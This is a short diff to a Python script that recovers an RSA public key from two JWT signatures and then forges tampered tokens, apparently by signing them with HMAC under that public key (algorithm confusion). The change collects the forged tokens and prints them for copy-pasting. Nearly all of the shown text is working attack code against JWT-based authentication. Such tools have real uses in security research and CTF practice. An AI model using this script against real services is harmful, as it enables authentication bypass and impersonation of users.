@@ -45,6 +45,7 @@ def forge_mac(jwt0, public_key):
 
     jwt0_tampered=b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
     print("[+] Tampered JWT: %s" % (jwt0_tampered))
+    return jwt0_tampered
 
 # e=mpz(65537) # Can be a couple of other common values
 
@@ -79,6 +80,8 @@ m1 = bytes2mpz(padded1)
 pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
 x509 = asn1tools.compile_files('x509.asn', codec='der')
 
+jwts=[]
+
 for e in [mpz(3),mpz(65537)]:
     gcd_res = gcd(pow(jwt0_sig, e)-m0,pow(jwt1_sig, e)-m1)
     #To speed things up switch comments on prev/next lines!
@@ -95,15 +98,19 @@ for e in [mpz(3),mpz(65537)]:
                 public_key=der2pem(x509_der, token="PUBLIC KEY").encode('ascii')
                 pem_out.write(public_key)
                 print("[+] Written to %s" % (pem_name))
-                forge_mac(jwt0, public_key)
+                jwts.append(forge_mac(jwt0, public_key))
             pem_name = "%s_%d_pkcs1.pem" % (hex(my_n)[2:18], e)
             with open(pem_name, "wb") as pem_out:
                 public_key=der2pem(pkcs1_pubkey).encode('ascii')
                 pem_out.write(public_key)
                 print("[+] Written to %s" % (pem_name))
-                forge_mac(jwt0, public_key)
-    
+                jwts.append(forge_mac(jwt0, public_key))
 
+print("="*80)
+print("Here are your JWT's once again for your copypasting pleasure")
+print("="*80)
+for j in jwts:
+    print(j.decode('utf8'))
 
 
 
